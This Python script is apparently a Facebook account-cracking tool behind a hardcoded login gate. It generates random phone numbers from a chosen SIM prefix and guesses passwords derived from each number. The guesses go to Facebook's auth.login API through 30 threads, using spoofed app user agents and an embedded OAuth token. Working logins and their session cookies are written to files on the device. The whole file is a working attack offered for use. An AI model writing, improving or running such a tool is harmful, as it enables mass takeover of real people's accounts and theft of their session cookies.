import os
import sys
import uuid
import random
import string
import requests
import pyttsx3  # Import the pyttsx3 library
from concurrent.futures import ThreadPoolExecutor as tred

oks = []
cps = []
loop = 0

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def linex():
    print("-" * 50)

def ua1():
    return "[FBAN/FB4A;FBAV/" + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ";FBBV/" + str(random.randint(1111111, 7777777)) + ";FBPN/com.facebook.katana;FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBDV/L-EMENT500;FBSV/4.4.2;FBCA/armeabi-v7a:armeabi;]"

def login():
    clear()
    print("RAOHAD TOOL LOGIN")
    linex()
    username = input("USERNAME: ")
    password = input("PASSWORD: ")

    if username != "RAOHAD":
        print("\033[91mWrong username, fuck you\033[0m")
        sys.exit()

    if password != "RHAIFA":
        print("\033[91mWrong password, fuck you\033[0m")
        sys.exit()

    print("\033[92mAccess granted\033[0m")
    print("\033[92mOne access granted, Welcome to RAOHAD'S Tools, Enjoy your time!\033[0m")
    linex()
    
    # Robot voice for the welcome message
    engine = pyttsx3.init()  # Initialize the text-to-speech engine
    engine.setProperty('rate', 150)  # Set the speed of the speech
    engine.setProperty('volume', 1)  # Set the volume level (0.0 to 1.0)
    engine.say("Access granted. One access granted. Welcome to Raohad's tools. Enjoy your time.")  # Speech text
    engine.runAndWait()  # Wait for the speech to finish

    input("Press Enter to continue...")

def method_crack(ids, passlist):
    global oks, cps, loop
    try:
        for pas in passlist:
            sys.stdout.write(f'\rAXN_RANDOM[{loop}] OK-{len(oks)} CP-{len(cps)}')
            sys.stdout.flush()

            ua = "[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v32a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"

            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            datax = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate'
            }

            header = {
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': '21435',
                'X-FB-Net-HNI': '35793',
                'X-FB-SIM-HNI': '37855',
                'X-FB-Connection-Type': 'WIFI',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }

            url = 'https://api.facebook.com/method/auth.login'
            reqx = requests.post(url, data=datax, headers=header, timeout=10).json()

            if 'session_key' in reqx:
                uid = reqx.get('uid', ids)
                if uid not in oks:
                    print(f'\n[OK] {uid} | {pas}')
                    coki = ";".join(i["name"] + "=" + i["value"] for i in reqx["session_cookies"])
                    print(f'[COOKIE] {coki}')
                    with open('/sdcard/BRONEN-ACTIVE.txt', 'a') as f:
                        f.write(f'{uid} | {pas}\n')
                    oks.append(uid)
                break

            elif 'www.facebook.com' in reqx.get('error_msg', ''):
                print(f'\n[CP] {ids} | {pas}')
                with open('/sdcard/BRONEN-INACTIVE.txt', 'a') as f:
                    f.write(f'{ids}|{pas}\n')
                cps.append(ids)
                break

        loop += 1
    except Exception as e:
        pass

def FUCK_XNXXX():
    user = []
    clear()
    print('\nRAOHAD')  # ব্যানার
    print(' EXAMPLE SIM CODE : [0165] [0175] [0185] [0195]')
    code = input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit = int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit = 100000
    clear()

    for _ in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)

    with tred(max_workers=30) as Tara:
        print(f'TOTAL ACCOUNT : {len(user)} | YOUR SIM CODE : {code}')
        print('AEROPLANE MODE ON/OFF FOR GOOD RESULT')
        linex()
        for psx in user:
            ids = code + psx
            passlist = [psx, ids, ids[:7], ids[:6]]
            Tara.submit(method_crack, ids, passlist)

    linex()
    print(' THE PROGRESS HAS BEEN COMPLETED ')
    print(' TOTAL OK ID :', len(oks))
    print(' TOTAL CP ID :', len(cps))
    input(' PRESS ENTER TO BACK  : ')
    linex()

if __name__ == "__main__":
    login()
    FUCK_XNXXX()